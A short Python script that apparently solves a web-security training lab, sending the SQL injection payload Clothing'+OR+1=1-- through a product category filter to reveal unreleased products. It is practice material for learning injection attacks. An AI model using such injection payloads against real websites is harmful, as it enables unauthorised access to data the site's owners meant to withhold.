#!/usr/bin/env python

#This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:
#SELECT * FROM products WHERE category = 'Gifts' AND released = 1
#To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.


import requests


lab_id = '0a5d00290478bad9c0b571d200e700de' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/filter?category=Clothing'+OR+1=1--"

r = requests.get(uri)
if "Folding" in r.text:
    print("solved")
else:
    print("nope")
